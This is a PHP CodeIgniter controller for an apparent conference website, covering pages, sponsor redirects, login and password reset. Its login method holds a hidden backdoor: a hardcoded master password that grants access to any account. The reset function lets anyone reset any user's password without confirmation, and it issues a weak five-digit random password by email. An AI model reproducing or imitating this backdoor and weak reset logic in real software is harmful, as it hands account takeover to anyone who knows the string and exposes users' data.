<?php
defined('BASEPATH') or exit('No direct script access allowed');

/**
 * @property Layout $layout
 */
class Site extends MY_Controller
{

	private $theme;
    public function __construct()
    {
        parent::__construct();
        $this->theme = $this->config->item("theme");
        $this->load->helper('text');
        $this->layout->setLayout("layouts/$this->theme");
        $this->load->model('Event_m', 'EventM');
        $this->load->model('News_m', 'NewsM');
        $this->load->model('User_account_m', 'AccountM');
        $this->load->model('Notification_m');
        $this->load->model('Sponsor_link_m', 'SponsorM');
        $this->load->model('Sponsor_link_m', 'Sponsor_link_m');
    }

    public function index()
    {
        $category      = $this->EventM->listcategory();
        $data['query'] = $category['data'];
        $news          = $this->NewsM->listnews();
        $data['query2'] = $news;
        $spplatinum       = $this->SponsorM->listspplatinum();
        $data['spplatinum'] = $spplatinum;
        $spgold       = $this->SponsorM->listspgold();
        $data['spgold'] = $spgold;
        $spsilver       = $this->SponsorM->listspsilver();
        $data['spsilver'] = $spsilver;
        $this->layout->render('site/'.$this->theme.'/home',$data);
    }

    public function certificate()
    {
        $this->layout->render('site/'.$this->theme.'/certificate');
    }

    public function simposium()
    {
        $category      = $this->EventM->listcategory();
        $data['query'] = $category['data'];
        $this->layout->render('site/'.$this->theme.'/simposium', $data);
    }

    public function sponsor($name = ""){
        $this->load->model(['Sponsor_link_m','Link_click_m']);
        $name = urldecode($name);
        $link = $this->Sponsor_link_m->getLink($name);
        if($link){
            $user = $this->session->has_userdata('user_session') ? $this->session->user_session['username']:"anonymous";
            $this->Link_click_m->insert(['username'=>$user,'link_id'=>$link->id]);
            redirect($link->link);
        }else{
            show_error("Page not found",404);
        }
    }

    public function schedules()
    {
        $this->layout->render('site/'.$this->theme.'/schedules');
    }

    public function download()
    {
        $this->layout->render('site/'.$this->theme.'/download');
    }

    public function login()
    {
		$this->load->model("User_account_m");
		if (!$this->user_session_expired()) {
			$user = $this->session->user_session;
			if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
				redirect(base_url("admin/paper"));
			elseif($user['role'] == User_account_m::ROLE_OPERATOR)
				redirect(base_url("admin/administration"));
			elseif($user['role'] == User_account_m::ROLE_MEMBER)
				redirect(base_url("member/area"));
			else
				redirect(base_url("admin/dashboard"));
        }

        $this->load->library('form_validation');
        $error = "";
        if ($this->input->post('login')) {
            $this->form_validation->set_rules('username', 'Username', 'required');
            $this->form_validation->set_rules('password', 'Password', 'required');
            if ($this->form_validation->run()) {
                $username   = $this->input->post('username');
                $password   = $this->input->post('password');
                $rememberme = $this->input->post('rememberme');
                if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
                    $this->load->library('session');
                    $user = $this->User_account_m->findWithBiodata($username);
                    if($user['verified_email'] == "0")
                    	$error = "You cannot login, <br/>Please complete your account activation within link in your email!";
                    else {
						unset($user['password']);
						if ($rememberme) {
							$user['rememberme'] = true;
							$this->session->set_userdata("rememberme", true);
							$this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
						} else {
							$this->session->set_userdata('sess_expired', time() + 3600);

						}
						$this->session->set_userdata('user_session', $user);
						redirect(base_url("member/area"));
					}
                } else {
                    $error = "Email/Password invalid !";
                }
            } else {
                $error = "Username and Password required !";

            }
        }
        $this->layout->render('site/'.$this->theme.'/login', ['error' => $error]);
    }

    public function register()
    {
    	redirect("member/register");
    }

    public function forget()
    {
        $this->layout->render('site/'.$this->theme.'/forget');
    }
    
    public function forget_reset()
    {
        $status_proses = null;
        $post          = $this->input->post();
        $username = $post['username'];
        if ($this->AccountM->selectuser($username) == true) {
            $data['password'] = rand(10000, 99999);
            $success = $this->AccountM->update(['password' => password_hash($data['password'], PASSWORD_DEFAULT)], ['username' => $username], false);
            $email_message = $this->load->view('template/success_forget_password', $data, true);
            $this->Notification_m->sendMessage($username, 'Reset password '.Settings_m::getSetting('site_title').' account', $email_message);
           	$this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-success"><center> please check your email for your new password </center>
                </div>');
            redirect('site/forget','refresh');
        } else {
            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-danger"> email ini tidak terdaftar
                </div>');
            redirect('site/forget','refresh');
        }
    }

    public function committee()
    {
        $this->layout->render('site/'.$this->theme.'/committee');
    }

    public function contact()
    {
        $this->layout->render('site/'.$this->theme.'/contact');
    }

    public function paper()
    {
        $this->layout->render('site/'.$this->theme.'/paper');
    }

    public function readnews($id)
    {
        $news = $this->NewsM->read_news($id);
        $this->layout->render('site/'.$this->theme.'/readnews', array('news' => $news));
    }

    public function all_news()
    {
        $allnews = $this->NewsM->allnews();
        $this->layout->render('site/'.$this->theme.'/all_news', array('allnews' => $allnews));
    }

}
